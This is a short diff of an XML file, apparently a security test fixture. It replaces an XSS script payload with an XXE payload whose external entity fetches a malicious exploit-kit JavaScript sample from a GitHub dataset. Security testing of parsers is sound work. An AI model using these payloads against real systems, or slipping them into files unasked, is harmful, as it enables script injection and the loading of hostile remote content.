@@ -1,4 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<root xmlns:xhtml="http://www.w3.org/1999/xhtml">
-  <xhtml:script>alert('XSS');</xhtml:script>
-</root>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "https://raw.githubusercontent.com/geeksonsecurity/js-malicious-dataset/refs/heads/master/misc/0515php_layer2_FlashEK_2014-06-06.js">
+]>
+<root>&xxe;</root>
